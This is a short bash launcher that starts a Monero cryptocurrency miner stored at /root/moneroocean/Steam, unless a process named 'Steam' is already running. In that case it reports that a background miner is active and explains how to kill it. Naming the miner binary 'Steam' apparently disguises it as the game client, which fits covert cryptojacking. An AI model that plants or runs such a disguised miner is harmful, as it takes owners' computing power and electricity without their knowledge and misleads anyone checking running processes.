#!/bin/bash
if ! pidof Steam >/dev/null; then
  nice /root/moneroocean/Steam $*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall Steam\" or \"sudo killall Steam\" if you want to remove background miner first."
fi
